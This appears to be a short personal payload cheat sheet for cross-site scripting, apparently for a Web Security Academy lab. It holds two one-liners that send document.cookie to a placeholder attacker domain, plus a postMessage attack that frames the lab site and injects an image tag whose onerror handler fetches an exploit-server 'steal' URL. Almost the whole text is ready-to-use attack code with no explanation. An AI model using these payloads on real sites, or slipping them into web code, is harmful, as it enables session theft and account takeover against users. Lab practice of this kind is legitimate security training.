new Image().src='https://<yourdomain.com>/log?cookie='+document.cookie;

fetch('https://<yourdomain.com>/log?c=' + document.cookie);





###############################
## postMessage attack vector ##
###############################
<iframe id="child" src="https://0a8f00be04c430b480ef03a700a20019.web-security-academy.net/" style="height:100px;width:100%;"></iframe>

<script>
  const iframe = document.getElementById('child');
  iframe.onload = () => {
    iframe.contentWindow.postMessage("<img src='x' onerror='fetch(\"https://exploit-0aac0045049430ef80cf02f101c6009f.exploit-server.net/steal?cookie=\" + document.domain);'>", '*');
  };

  window.addEventListener('message', (e) => {
    console.log('Parent received:', e.data);
  });
</script>